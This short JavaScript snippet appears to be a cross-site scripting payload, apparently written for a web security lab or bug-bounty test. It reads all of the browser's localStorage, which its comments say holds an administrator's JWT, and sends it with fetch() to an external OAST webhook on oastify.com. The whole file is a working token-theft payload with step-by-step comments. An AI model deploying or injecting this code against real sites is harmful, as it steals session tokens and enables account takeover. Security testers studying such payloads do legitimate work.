(function() {
    // 1. Read all local storage data, which includes the admin's JWT
    const data = JSON.stringify(localStorage);
    
    // 2. The exfiltration URL (your OAST webhook)
    // We use a query parameter to send the data.
    const webhookUrl = 'https://qwqy4v8rxcoztu86tnx3mvuqjhp8dz1o.oastify.com/';
    
    // 3. Make the request to send the data
    fetch(webhookUrl + '?token_data=' + encodeURIComponent(data));
})();
